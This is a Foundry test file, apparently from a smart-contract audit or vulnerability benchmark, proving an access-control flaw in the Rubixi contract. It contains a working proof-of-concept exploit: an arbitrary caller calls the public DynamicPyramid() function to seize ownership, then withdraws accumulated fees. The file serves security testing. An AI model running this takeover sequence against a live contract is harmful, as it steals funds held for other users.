
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;
    address public originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // The vulnerability is that DynamicPyramid() can be called by anyone
        // to become the creator/owner. We don't exclude any privileged roles
        // because the point is to prove ANY arbitrary user can become owner.

        // --- 2. State Configuration ---
        // Fund the caller so they can later collect fees if needed
        vm.deal(caller, 10 ether);
        
        // Fund the contract with some fees to demonstrate the impact
        vm.deal(address(this), 1 ether);
        (bool success,) = address(_contractUnderTest).call{value: 0.5 ether}("");
        require(success, "Initial funding failed");

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // The vulnerability: DynamicPyramid() is a public function that sets creator
        // In Solidity 0.8.x, this is just a regular function, not a constructor
        // Anyone can call it to become the owner
        _contractUnderTest.DynamicPyramid();
        
        // Verify the caller is now the owner by attempting to call an onlyowner function
        // If the caller successfully became the owner, they can now collect fees
        
        // First, let's add more fees to the contract
        vm.deal(address(this), 1 ether);
        (success,) = address(_contractUnderTest).call{value: 0.5 ether}("");
        require(success, "Second funding failed");
        
        // Now the attacker (caller) should be able to collect fees
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        _contractUnderTest.collectAllFees();
        
        // Assert that the caller received the fees, proving they became the owner
        uint256 callerBalanceAfter = caller.balance;
        assertGt(callerBalanceAfter, callerBalanceBefore, "Caller should have received fees as new owner");
    }

    receive() external payable {}
}
